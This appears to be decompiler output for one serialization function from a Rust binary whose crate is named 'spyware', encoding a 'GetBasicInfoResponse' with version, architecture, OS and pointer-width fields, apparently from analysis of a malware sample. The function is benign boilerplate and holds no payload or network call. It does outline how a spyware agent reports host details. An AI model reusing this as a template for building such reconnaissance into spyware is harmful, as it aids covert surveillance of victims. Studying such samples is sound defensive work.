fn spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::GetBasicInfoResponse>::serialize(a0: u64, a1: u64, a2: &u64) -> long long {
    let v0: Result<struct48, struct13>;  // [bp-0x50]
    let v1: struct52;  // [bp-0x50], Other Possible Types: u448
    let v2: u32;  // [bp-0x4c]
    let v3: void*;  // [bp-0x48], Other Possible Types: u64
    let v4: u8;  // [bp-0x40]
    let v5: u128;  // [bp-0x30]
    let v6: void*;  // [bp-0x20]
    let v7: u8;  // [bp-0x18]
    let v9: u128;  // xmm0

    v0 = <&mut ron::ser::Serializer<W> as serde::ser::Serializer>::serialize_struct(a2, "GetBasicInfoResponse", 6);
    match v0 {
        Ok(_) => {
            return struct56 {
                field_0: v0 as i32
                field_4: v2
                field_8: v3
                field_16: v4
                field_17: <UNKNOWN>
                field_32: <UNKNOWN>
            };
        },
        Err(_) => {
            v6 = v3;
            v7 = v4;
            v1 = <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v6, "version", a1 + 56);
            if v1.field_0 == 33 {
                v1 = <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v6, "arch", a1 + 61);
                if v1.field_0 == 33 {
                    v1 = <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v6, "target_os", a1 + 62);
                    if v1.field_0 == 33 {
                        v1 = <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v6, "operating_system_version", a1);
                        if v1.field_0 == 33 {
                            v1 = <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v6, "pointer_width", a1 + 60);
                            if v1.field_0 == 33 {
                                v1 = <ron::ser::Compound<W> as serde::ser::SerializeStruct>::serialize_field(&v6, "error_info", a1 + 24);
                                if v1.field_0 == 33 {
                                    <ron::ser::Compound<W> as serde::ser::SerializeStruct>::end(a0, v6, v7 as u32);
                                    return a0;
                                }
                            }
                        }
                    }
                }
            }
            v9 = v1 as i128;
            return struct48 {
                field_0: v9
                field_16: *((&v1 as &char + 16) as &i128)
                field_32: v5
            };
        },
    }
}
